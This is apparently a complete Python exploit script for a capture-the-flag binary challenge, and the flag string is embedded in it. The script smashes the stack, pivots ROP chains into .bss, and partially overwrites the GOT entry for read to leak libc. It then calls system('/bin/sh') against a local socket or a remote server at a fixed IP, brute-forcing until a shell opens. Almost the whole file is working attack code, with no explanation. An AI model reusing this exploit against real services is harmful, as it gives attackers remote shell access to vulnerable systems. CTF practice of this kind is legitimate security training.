#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'13.231.207.73', 'port':9002})
env.set_item('libc',    debug   = None, \
                        local   = 'libc-2.23.so', \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_bss            = binf.sep_section['.bss']
addr_stack          = addr_bss + 0xf00

addr_setup          = binf.symbols['setup']
addr_main           = binf.symbols['main']
addr_got_read       = binf.got['read']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_puts     = libc.sep_function['puts']
offset_libc_read     = libc.sep_function['read']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)
    rop.read(constants.STDIN_FILENO, addr_stack)
    rop.migrate(addr_stack)

    exploit  = b'a'*0x28
    exploit += bytes(rop)
    conn.send(exploit)

    rop = ROP(binf)
    rop.read(constants.STDIN_FILENO, addr_stack-0x28)
    rop.read(constants.STDIN_FILENO, addr_stack-0x20)
    rop.raw(rop.rdi)
    rop.raw(addr_got_read)
    rop.migrate(addr_stack - 0x28)

    exploit  = p64(addr_setup)
    exploit += bytes(rop)
    sleep(0.2)
    conn.send(exploit)

    sleep(0.2)
    conn.send(p16((offset_libc_puts - 0x4000) & 0xffff))

    sleep(0.2)
    conn.send(p64(addr_main))

    addr_libc_read = u(conn.recvuntil('\n', drop=True))
    libc.address = addr_libc_read - offset_libc_read
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(binf)
    rop.call(addr_libc_system, [addr_libc_str_sh])

    exploit  = b'a'*0x28
    exploit += bytes(rop)
    sleep(0.2)
    conn.send(exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # zer0pts{b0f_i5_4lw4y5_d4ng3r0u5}

if __name__=='__main__':
    main()

#==========
